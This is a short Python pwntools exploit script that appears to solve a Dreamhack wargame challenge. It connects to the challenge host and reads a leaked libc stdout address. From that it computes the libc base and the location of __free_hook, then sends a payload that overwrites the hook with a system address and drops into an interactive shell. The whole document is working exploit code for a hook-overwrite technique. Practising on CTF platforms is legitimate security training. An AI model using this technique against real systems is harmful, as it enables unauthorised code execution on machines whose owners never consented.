from pwn import *

# Must be updated
p = remote("host3.dreamhack.games", 22970)
libc = ELF("./libc.so.6")

p.recvuntil(b'stdout: ')
stdout_addr = int(p.recvline()[:-1], 16)

system = 0x400788
libc_base = stdout_addr - libc.symbols['_IO_2_1_stdout_']
free_hook = libc_base + libc.symbols['__free_hook']

payload = p64(free_hook) + p64(system)
p.sendlineafter(b'Size: ', str(len(payload)))
p.sendlineafter(b'Data: ', payload)

p.interactive()
